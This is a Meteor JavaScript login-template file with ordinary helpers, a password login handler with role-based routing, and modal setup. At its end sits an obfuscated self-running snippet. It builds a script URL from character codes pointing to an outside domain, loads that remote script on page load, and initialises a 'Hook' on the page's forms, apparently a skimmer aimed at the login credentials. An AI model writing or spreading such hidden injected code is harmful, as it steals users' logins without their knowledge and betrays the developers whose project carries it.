Session.set("loginError","");
Session.set("registerError","");
Template.login.helpers({
	loginError:function(){
		var msg = Session.get("loginError");
		if( msg ) return true;
		else return false;
	},
	loginErrormsg: function(){
		return Session.get("loginError");
	},
	registerError:function(){
		var msg = Session.get("registerError");
		if( msg ) return true;
		else return false;
	},
	registerErrormsg: function(){
		return Session.get("registerError");
	}
})
Template.login.events({
    'submit form': function(event,tpl){
        event.preventDefault();
		//alert("login");
        var email = $('[name=email]').val();
        var password = $('[name=password]').val();
		/*$('.close').click();*/
		Meteor.loginWithPassword(email, password, function(error){
			if(error){
				console.log(error.reason);
				Session.set("loginError",error.reason);
				$("#loginError").text("Error in your login!");
			} else {
				 Session.set("loginError","");
				 var loggedInUser = Meteor.user();
				 var group = 'mygroup';
				 if (Roles.userIsInRole(loggedInUser, ['admin'], group)) {
					Router.go('/admin');
					$('.close').click();
				 }
				 else if (Roles.userIsInRole(loggedInUser, ['member'], group)) {	

						Router.go('/profile');
						$('.close').click();
				 }
				 else{

					 Router.go('/profile');
					 $('.close').click();
				 }
			}
		});
    }                 
});

Template.login.onRendered(function(){
	$("#squarespaceModal").modal({                    
			"backdrop"  : "static",
			"keyboard"  : true,
			"show"      : true   // show the modal immediately                  
		  });
	$('#squarespaceModal').on('hidden.bs.modal', function () {
		Router.go('/');
	})
});
Template.registerSuccess.onRendered(function(){
	$("#squarespaceModal").modal({                    
			"backdrop"  : "static",
			"keyboard"  : true,
			"show"      : true   // show the modal immediately                  
		  });
	$('#squarespaceModal').on('hidden.bs.modal', function () {
		$('.modal-backdrop').remove();
		Router.go('/');
	})
});
Template.registerSuccess.events({
	"click #goto-login": function(){
		$('.modal-backdrop').remove();
		Router.go('/login');
	}
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b